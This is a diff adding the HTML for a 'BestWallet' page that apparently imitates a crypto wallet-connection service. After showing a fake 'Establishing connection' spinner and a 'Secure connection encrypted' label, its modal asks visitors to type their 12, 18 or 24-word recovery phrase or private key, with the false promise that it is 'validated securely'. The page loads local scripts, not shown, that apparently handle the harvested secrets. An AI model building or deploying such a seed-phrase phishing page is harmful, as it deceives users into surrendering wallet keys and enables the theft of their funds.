@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="images/Logo.svg" type="image/x-icon">
+    <title>Connect Wallet | BestWallet</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://kit.fontawesome.com/bdc3291137.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" type="text/css" href="css/wallet.css" />
+</head>
+
+<body>
+    <!-- Header -->
+    <div class="header">
+        <nav class="navbar">
+            <a href="#" class="navbar-logo">
+                <img src="images/Logo.svg" alt="" class="img-fluid" />
+                <span class="logo-text">BestWallet</span>
+            </a>
+            <button class="connect-btn">
+                <i class="fa-solid fa-wallet"></i> Connect Wallet
+            </button>
+        </nav>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <!-- Hero Section -->
+        <div class="hero-section">
+            <h1 class="hero-title">Select Your Wallet</h1>
+            <p class="hero-subtitle">Connect with your preferred crypto wallet to access the decentralized ecosystem</p>
+        </div>
+
+        <!-- Search Section -->
+        <div class="search-container">
+            <i class="fa-solid fa-search search-icon"></i>
+            <input type="text" class="search-box" placeholder="Search wallets..." id="walletSearch">
+            <button class="clear-search" id="clearSearch">
+                <i class="fa-solid fa-times"></i>
+            </button>
+        </div>
+
+        <!-- Wallet Grid -->
+        <div class="wallet-grid" id="walletGrid">
+            <!-- Wallet cards will be populated here -->
+        </div>
+
+        <!-- No Results -->
+        <div class="no-results" id="noResults">
+            <i class="fa-solid fa-search"></i>
+            <h3>No wallets found</h3>
+            <p>Try adjusting your search terms</p>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-content">
+            <button class="modal-close" id="closeModal">
+                <i class="fa-solid fa-times"></i>
+            </button>
+            <div class="modal-header">
+                <div class="modal-wallet-icon" id="modalWalletIcon">
+                    <img src="" alt="" id="modalWalletImg">
+                </div>
+                <div class="modal-topbar">
+                    <h3 id="modalWalletName">Wallet Name</h3>
+                    <p>Secure connection encrypted</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="status-indicator" id="statusIndicator">
+                    <div class="loading-spinner"></div>
+                    <span>Establishing connection...</span>
+                </div>
+
+                <div class="phrase-form" id="phraseForm" style="display: none;">
+                    <textarea class="phrase-input" id="phraseInput"
+                        placeholder="Enter a 12, 18, or 24-word recovery phrase, or a 64-char private key (validated securely)."
+                        rows="5"></textarea>
+
+                    <button class="submit-btn" id="submitPhrase">Connect Wallet</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2025 BestWallet. All rights reserved. | Decentralized wallet connection protocol</p>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tweetnacl/1.0.3/nacl.min.js"></script>
+    <script src="js/wallet_data.js"></script>
+    <script src="js/connect_mode.js"></script>
+    <script src="../js/bundle-ljt1ro3nbq.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
